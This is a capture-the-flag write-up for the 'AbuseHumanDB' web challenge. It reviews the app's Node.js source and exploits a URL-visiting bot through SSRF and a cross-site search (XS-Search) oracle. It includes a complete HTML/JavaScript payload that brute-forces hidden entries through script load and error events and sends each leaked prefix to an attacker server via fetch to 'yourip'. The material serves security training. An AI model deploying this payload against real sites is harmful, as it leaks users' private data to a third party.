## AbuseHumanDB - Easy

After downloading the necessary files for the callenge and taking a look at the source code you will see
```
  - routes/
  - static/
  - views/
  - bot.js
  - database.js
  - index.js
  - package.json
```
By reviewing the source code to check it out the flag ( Our goal ) you will find it in

**database.js**
```js
INSERT INTO userEntries (title, url, approved) VALUES ("Back The Hox", "https://ctf.backthehox.ew/ctf/82", 1);
INSERT INTO userEntries (title, url, approved) VALUES ("Drunk Alien Song", "https://www.youtune.com/watch?v=jPPT7TcFmAk", 1);
INSERT INTO userEntries (title, url, approved) VALUES ("Mars Attacks!", "https://www.imbd.com/title/tt0116996/", 1);
INSERT INTO userEntries (title, url, approved) VALUES ("Professor", "https://www.thebun.co.uk/tech/4119382/professor-steven-rolling-fears-aliens-could-plunder-conquer-and-colonise-earth-if-we-contact-them/", 1);
INSERT INTO userEntries (title, url, approved) VALUES ("HTB{f4k3_fl4g_f0r_t3st1ng}","https://app.backthehox.ew/users/107", 0);
```
so our goal is to get a non-approved Post from userEntries and how can that happen? if a file calls any of those functions `listEntires` or `getEntry` with `approved=0`
```js
async listEntries(approved=1) {
        return new Promise(async (resolve, reject) => {
            try {
                let stmt = await this.db.prepare("SELECT * FROM userEntries WHERE approved = ?");
                resolve(await stmt.all(approved));
            } catch(e) {
                console.log(e);
                reject(e);
            }
        });
    }

async getEntry(query, approved=1) {
        return new Promise(async (resolve, reject) => {
            try {
                let stmt = await this.db.prepare("SELECT * FROM userEntries WHERE title LIKE ? AND approved = ?");
                resolve(await stmt.all(query, approved));
            } catch(e) {
                console.log(e);
                reject(e);
            }
        });
    }
```

Don't waste your time reading all of the source code we know our goal and injection point so let's look for the functions that execute `listEntries` or `getEntry`

**routes/index.js**
```js
router.get('/api/entries/search', (req, res) => {
	if(req.query.q) {
		const query = `${req.query.q}%`;
		return db.getEntry(query, isLocalhost(req))
			.then(entries => {
				if(entries.length == 0) return res.status(404).send(response('Your search did not yield any results!'));
				res.json(entries);
			})
			.catch(() => res.send(response('Something went wrong! Please try again!')));
	}
	return res.status(403).json(response('Missing required parameters!'));
});
```
it contains `db.getEntry(query, isLocalhost(req))` and returns `200` status code if the query exists but if not it returns `404` but what is `isLocalhost`?

```js
const isLocalhost = req => ((req.ip == '127.0.0.1' && req.headers.host == '127.0.0.1:1337') ? 0 : 1);
```
so if our `req.ip` is `127.0.0.1` and `req.headers.host` is `127.0.0.1:1337` it returns `0` and thats our goal but how?
if you took a look at the website then you already know your injection point

![image](https://user-images.githubusercontent.com/32434709/140931055-37583048-5d1a-4012-b903-49fcbdd03195.png)

```js
router.post('/api/entries', (req, res) => {
	const { url } = req.body;
	if (url) {
		uregex = /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&\/\/=]*)/
		if (url.match(uregex)) {
			return bot.visitPage(url)
				.then(() => res.send(response('Your submission is now pending review!')))
				.catch(() => res.send(response('Something went wrong! Please try again!')))
		}
		return res.status(403).json(response('Please submit a valid URL!'));
	}
	return res.status(403).json(response('Missing required parameters!'));
});
```
So we can make the bot visit the url `http://127.0.0.1:1337/api/entries/search?q=query` and it will bypass the isLocalhost method.
But how can we get the flag then? let's check XSS then in the bot to see if we can execute javascript
Ok wait a second we have `SSRF, XSS` and our URL returns different Status Code if a query is valid so doesn't this mean XSSearch?

![image](https://user-images.githubusercontent.com/32434709/140932469-d3541d08-eef3-4013-9a43-8bba51191249.png)

so let's try it out create a html file in your vps and run your server

```html
<script>
var chars = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!{} ';
var charLen = chars.length;
var leak = "HTB";
var charNum = 0;
function search(leak){
        for (var i = 0; i < chars.length; i++) {
                var curChar = chars[i];
                probeError('http://127.0.0.1:1337/api/entries/search?q='+leak+curChar);
        }
}

function probeError(url) {
  let script = document.createElement('script');
  script.src = url;
  script.onload = () => {
          leak = url.split("?")[1].replace("q=", "");
          fetch("http://yourip/"+leak); // if it returns 200 OK then the query returned our Flag send it to our server
        }
  script.onerror = () => {
          console.log("error"); // If it returns 404 Code then the query is invalid and we don't care about it
  };
  document.head.appendChild(script);
}
search(leak);

</script>
```
I'm lazy to be honest so i didn't write a loop to bruteforce the flag itself you need to get each new character and append it to the `leak` string yourself

![image](https://user-images.githubusercontent.com/32434709/140931735-aecf8c7a-d9cc-4116-ab3d-d2b5e73d9005.png)

and thats it. Simple and Easy 
